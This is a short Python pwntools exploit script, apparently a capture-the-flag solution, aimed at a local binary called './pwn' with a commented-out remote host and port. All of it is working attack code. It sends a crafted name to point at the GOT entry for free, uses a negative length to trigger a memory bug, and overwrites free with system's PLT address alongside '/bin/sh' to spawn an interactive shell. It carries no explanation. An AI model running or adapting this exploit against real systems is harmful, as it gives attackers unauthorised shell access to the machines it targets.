from pwn import*

sh = process('./pwn')
#202.198.27.90:28069
#sh = remote('202.198.27.90',28069)

elf = ELF('./pwn')

payload = b'a' * 0x10 + p64(elf.got['free'] - 0x10)
sh.sendafter(b'name',payload)


sh.sendafter(b'How long?',b'-99999999\x00')

payload = b'/bin/sh'
payload = payload.ljust(0x10,b'\x00')
payload += p64(elf.plt['system'])

sh.sendafter(b'What ??:',payload)

sh.interactive()
